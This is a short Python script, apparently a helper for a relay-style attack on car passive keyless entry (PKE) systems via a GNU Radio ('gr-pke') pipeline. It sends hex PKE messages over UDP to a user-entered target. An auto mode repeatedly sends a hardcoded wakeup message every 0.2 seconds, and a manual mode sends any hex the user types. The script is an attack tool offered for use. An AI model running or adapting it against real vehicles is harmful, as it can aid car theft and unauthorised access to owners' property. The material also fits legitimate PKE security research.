# Message Generator script to make it easier to use the marco attack via gr-pke

import math # needed for hex to bin conversion

import socket # needed for udp socket
import sys # needed for udp socket

from threading import Thread # needed for multithreading
import time # needed for auto mode

class MessageGen:
    """
    Class that handles custom PKE message generation
    """

    def __init__(self, ipAddr, portNum):
        """
        Initalization Message

        Args:
            ipAddr (string): The IP Address to transmit the message to
            portNum (int): The port number to send the message to
        """

        # Creates the UDP socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Holds the server address
        self.serverAddress = (str(ipAddr), int(portNum))

    def sendMsg(self, message):
        """
        Generates and transmits the message

        Args:
            message (str): The PKE message in hex
        """

        print(f'Sending: {str(message)}')

        self.socket.sendto(message.encode(), self.serverAddress)

    def decodeMsg(self, message):
        """
        Decodes the hex string into binary with all leading zeros

        Args:
            message (str): The hex string to decode
        """

        # Code to convert hex to binary 
        res = "{0:08b}".format(int(message, 16)) 
        
        # Print the resultant string 
        print ("Resultant transmission should be", str(res)) 

    def autoThread(self):
        """
        Thread that auto transmits the wakeup message
        """

        message = "FFEABA000000FFEABA000000FFEABA"

        while True:
            try:
                
                self.sendMsg(message)
                self.decodeMsg(message)

                time.sleep(0.2)
            except KeyboardInterrupt:
                print("\nKeyboard interrupt detected, shuting down")
                sys.exit(1)
                break

    def manThread(self):
        """
        Thread that lets the user manually enter a message to send
        """

        while True:
            try:

                message = input("\nEnter the hex message to transmit: ")
                self.sendMsg(message)
                self.decodeMsg(message)

            except KeyboardInterrupt:
                print("\nKeyboard interrupt detected, shuting down")
                sys.exit(1)
                break


if __name__ == "__main__":

    print("Starting PKE Message generator")

    ipAddr = input('Enter target IP Address: ')
    portNum = input('Enter target port number: ')
    runMode = input('Enter 1 for auto mode, andything else for manual:')

    messageGen = MessageGen(ipAddr, portNum)

    if runMode == '1':
        messageGen.autoThread()
    else:
        messageGen.manThread()
